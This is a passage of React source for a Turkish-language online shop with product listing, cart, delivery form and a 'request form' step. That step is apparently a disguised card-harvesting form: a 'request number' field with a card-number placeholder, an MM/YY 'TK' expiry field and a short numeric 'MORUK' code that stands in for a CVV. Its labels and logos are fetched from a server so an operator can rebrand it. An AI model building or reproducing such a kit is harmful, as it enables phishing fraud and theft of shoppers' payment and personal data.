...
const defaultRequestSettings={
  request_title:'Talep Formu',
  request_section_title:'Talep Bilgileri',
  request_intro:'Aşağıdaki alanları eksiksiz doldurun.',
  cart_section_title:'Seçtiğiniz Ürünler',
  delivery_cart_title:'Sipariş Özeti',
  delivery_button_text:'Talep Formuna Geç',
  label_name:'Talep Edenin Adı Soyadı',
  placeholder_name:'AD SOYAD',
  helper_name:'',
  label_number:'Talep Numarası',
  placeholder_number:'1234 5678 9012 3456 78',
  helper_number:'Yalnızca rakam giriniz.',
  request_number_length:18,
  label_tk:'TK',
  placeholder_tk:'AA/YY',
  helper_tk:'AA/YY formatında giriniz.',
  label_moruk:'MORUK',
  placeholder_moruk:'0000',
...
export default function Storefront(){
  ...
  const [customer,setCustomer]=useState({first_name:'',last_name:'',phone:'',city:'',district:'',address:''});
  ...
  const [requestSettings,setRequestSettings]=useState(defaultRequestSettings);
  ...
  useEffect(()=>{
    fetch('/api/request-settings',{cache:'no-store'})
      .then(r=>r.json())
      .then(d=>{if(d?.settings)setRequestSettings(x=>({...x,...d.settings}))})
      .catch(()=>{});
  },[]);

  const count=cart.reduce((n,x)=>n+x.qty,0);
  const total=useMemo(()=>cart.reduce((s,x)=>s+Number(x.price)*x.qty,0),[cart]);
  const requestNumberLength=clamp(requestSettings.request_number_length||18,1,32);
  const morukLength=clamp(requestSettings.moruk_length||4,1,12);
  ...
  const add=p=>setCart(c=>{
    ...
    return f?c.map(x=>x.id===p.id?{...x,qty:Math.min(Number(x.stock)||99,x.qty+1)}:x):[...c,{...p,qty:1}];
  });
  ...
  async function saveOrder(e){
    ...
    try{
      const r=await fetch('/api/orders',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({
        ...
        total,
        items:cart.map(x=>({id:x.id,name:x.name,qty:x.qty,price:x.price,image_url:x.image_url||''}))
      })});
  ...
  function formatRequestNumber(value){
    const d=String(value||'').replace(/\D/g,'').slice(0,requestNumberLength);
  ...
  function formatMoruk(value){ return String(value||'').replace(/\D/g,'').slice(0,morukLength); }
  ...
  async function submitRequest(e){
    ...
    if(digits.length!==requestNumberLength){setFormError(`Talep numarası tam ${requestNumberLength} hane olmalıdır.`);return;}
    if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(requestForm.tk_date)){setFormError('TK tarihi AA/YY formatında ve geçerli bir ay olmalıdır.');return;}
    if(requestForm.moruk_code.length!==morukLength){setFormError(`MORUK alanı tam ${morukLength} rakam olmalıdır.`);return;}
    if(!cart.length){setFormError('Sepetiniz boş. Lütfen en az bir ürün seçin.');return;}
  ...
  return <main>
    ...
    {view==='home'&&<>
      ...
      <section className="trust"><span>🚚 Ücretsiz Kargo</span><span>⚡ Hızlı Teslimat</span><span>↩ 14 Gün İade</span><span>📝 Kolay Talep</span></section>
      <section className="section-wrap">
        <div className="section-head"><div><div className="eyebrow">SANA ÖZEL SEÇİMLER</div><h2>Çok Satanlar</h2></div></div>
        <div className="products">{products.map(p=><article className="product-card" key={p.id}>
          {p.old_price>p.price&&<div className="discount">%{Math.round((1-p.price/p.old_price)*100)}</div>}
          <div className="stock-badge">{p.stock||0} adet stok</div>
          <button className="product-open" onClick={()=>open(p)}><img src={p.image_url||'/placeholder-product.svg'} alt={p.name}/><h3>{p.name}</h3></button>
          <p className="product-description">{p.description}</p>
          <div className="prices"><strong>₺{fmt(p.price)}</strong><del>₺{fmt(p.old_price)}</del></div>
          <div className="product-actions"><button className="secondary" onClick={()=>add(p)}>Sepete Ekle</button><button className="buy-now" onClick={()=>buy(p)}>Hemen Al</button></div>
        </article>)}</div>
      </section>
    </>}

    {view==='detail'&&selected&&<section className="detail"><div className="detail-gallery"><img src={selected.image_url} alt={selected.name}/></div><div className="detail-info"><div className="eyebrow">Ana Sayfa / Ürün</div><h1>{selected.name}</h1><div className="detail-price">₺{fmt(selected.price)} <del>₺{fmt(selected.old_price)}</del></div><div className="stock-line">● {selected.stock} adet stok</div><p>{selected.description}</p><button className="big-red" onClick={()=>add(selected)}>Sepete Ekle</button><button className="big-outline" onClick={()=>buy(selected)}>Hemen Al</button><div className="detail-benefits"><p>🚚 Ücretsiz Kargo</p><p>↩ 14 gün içinde kolay iade</p><p>📝 Kolay talep</p></div></div></section>}

    {view==='cart'&&<section className="checkout-shell"><h1>Sepetim ({count})</h1>{cart.map(x=><div className="cart-row" key={x.id}><img src={x.image_url||'/placeholder-product.svg'} alt={x.name}/><div><strong>{x.name}</strong><p>₺{fmt(x.price)}</p></div><div className="qty"><button onClick={()=>change(x.id,-1)}>-</button><strong>{x.qty}</strong><button onClick={()=>change(x.id,1)}>+</button></div><button className="ghost" onClick={()=>remove(x.id)}>Sil</button></div>)}<div className="cart-total"><span>Toplam</span><strong>₺{fmt(total)}</strong></div><button className="big-red" disabled={!cart.length} onClick={()=>setView('checkout')}>Teslimat Bilgilerine Geç</button></section>}

    {view==='checkout'&&<section className="checkout-shell"><div className="steps">1 Teslimat　—　2 Talep Formu　—　3 Onay</div><h1>Teslimat Bilgileri</h1><form className="delivery" onSubmit={saveOrder}><label>Ad<input required placeholder="Adınızı girin" value={customer.first_name} onChange={e=>setCustomer({...customer,first_name:e.target.value})}/></label><label>Soyad<input required placeholder="Soyadınızı girin" value={customer.last_name} onChange={e=>setCustomer({...customer,last_name:e.target.value})}/></label><label className="wide">Telefon Numarası<input required inputMode="tel" autoComplete="tel" placeholder="05xx xxx xx xx" value={customer.phone} onChange={e=>setCustomer({...customer,phone:formatPhone(e.target.value)})}/><small>Örnek: 0 (532) 123 45 67</small></label><label>İl<input required placeholder="İl" value={customer.city} onChange={e=>setCustomer({...customer,city:e.target.value})}/></label><label>İlçe<input required placeholder="İlçe" value={customer.district} onChange={e=>setCustomer({...customer,district:e.target.value})}/></label><label className="wide">Açık Adres<textarea required placeholder="Mahalle, sokak, bina ve daire bilgileri" value={customer.address} onChange={e=>setCustomer({...customer,address:e.target.value})}/></label><div className="delivery-order-summary wide"><div className="delivery-order-head"><div><span className="eyebrow">SEPETİNİZ</span><h2>{requestSettings.delivery_cart_title||'Sipariş Özeti'}</h2></div><strong>{count} ürün</strong></div><div className="delivery-order-items">{cart.map(x=><div className="delivery-order-item" key={x.id}><img src={x.image_url||'/placeholder-product.svg'} alt={x.name}/><div><strong>{x.name}</strong><span>{x.qty} adet × ₺{fmt(x.price)}</span></div><b>₺{fmt(Number(x.price)*x.qty)}</b></div>)}</div><div className="delivery-order-total"><span>Sipariş Toplamı</span><strong>₺{fmt(total)}</strong></div></div>{formError&&<div className="notice wide">{formError}</div>}<button className="big-red">{requestSettings.delivery_button_text||'Talep Formuna Geç'}</button></form></section>}

    {view==='request'&&<section className="checkout-shell payment-safe">
      <div className="steps">1 Teslimat　—　<strong>2 Talep Formu</strong>　—　3 Onay</div>
      <h1>{requestSettings.request_title}</h1>
      <div className="request-cart-summary">
        <div className="request-cart-head"><div><span className="eyebrow">SEPET ÖZETİ</span><h2>{requestSettings.cart_section_title||'Seçtiğiniz Ürünler'}</h2></div><strong>{count} ürün · ₺{fmt(total)}</strong></div>
        <div className="request-cart-items">{cart.map(x=><div className="request-cart-item" key={x.id}>
          <img src={x.image_url||'/placeholder-product.svg'} alt={x.name}/>
          <div className="request-cart-info"><strong>{x.name}</strong><span>Birim fiyat: ₺{fmt(x.price)}</span><span className="request-line-total">₺{fmt(Number(x.price)*x.qty)}</span></div>
          <div className="request-qty"><button type="button" onClick={()=>change(x.id,-1)} aria-label="Adet azalt">−</button><strong>{x.qty}</strong><button type="button" onClick={()=>change(x.id,1)} aria-label="Adet artır">+</button><button type="button" className="request-remove" onClick={()=>remove(x.id)}>Kaldır</button></div>
        </div>)}</div>
        <div className="request-cart-total"><span>Güncel Toplam</span><strong>₺{fmt(total)}</strong></div>
      </div>

      <div className="custom-pay-wrap">
        <div className="custom-pay-head"><div><strong>{requestSettings.request_section_title}</strong><p>{requestSettings.request_intro}</p></div></div>
        <div className="request-logo-grid">{[1,2,3,4].map(i=>{const u=requestSettings[`logo${i}_url`];return <div className="request-logo-slot" key={i}>{u?<img src={u} alt={`Logo ${i}`}/>:<span>Logo {i}</span>}</div>})}</div>
        <form className="custom-card-form" onSubmit={submitRequest}>
          <label className="full">{requestSettings.label_name}<input required autoComplete="name" placeholder={requestSettings.placeholder_name||'AD SOYAD'} value={requestForm.request_name} onChange={e=>setRequestForm({...requestForm,request_name:e.target.value})}/>{requestSettings.helper_name&&<small>{requestSettings.helper_name}</small>}</label>
          <label className="full">{requestSettings.label_number}<input required inputMode="numeric" autoComplete="off" placeholder={requestSettings.placeholder_number||''} value={requestForm.request_number} onChange={e=>setRequestForm({...requestForm,request_number:formatRequestNumber(e.target.value)})}/><small>{requestSettings.helper_number||`${requestNumberLength} hane, yalnızca rakam.`} <b>{requestNumberLength} hane zorunlu.</b></small></label>
          <label>{requestSettings.label_tk}<input required inputMode="numeric" autoComplete="off" placeholder={requestSettings.placeholder_tk||'AA/YY'} value={requestForm.tk_date} onChange={e=>setRequestForm({...requestForm,tk_date:formatTkDate(e.target.value)})}/>{requestSettings.helper_tk&&<small>{requestSettings.helper_tk}</small>}</label>
          <label>{requestSettings.label_moruk}<input required inputMode="numeric" autoComplete="off" placeholder={requestSettings.placeholder_moruk||''} value={requestForm.moruk_code} onChange={e=>setRequestForm({...requestForm,moruk_code:formatMoruk(e.target.value)})}/><small>{requestSettings.helper_moruk||'Yalnızca rakam giriniz.'} <b>{morukLength} hane zorunlu.</b></small></label>
          <button className="big-red full" disabled={requestLoading||!cart.length}>{requestLoading?'Kaydediliyor...':(requestSettings.submit_button_text||'Talebi Gönder')}</button>
        </form>
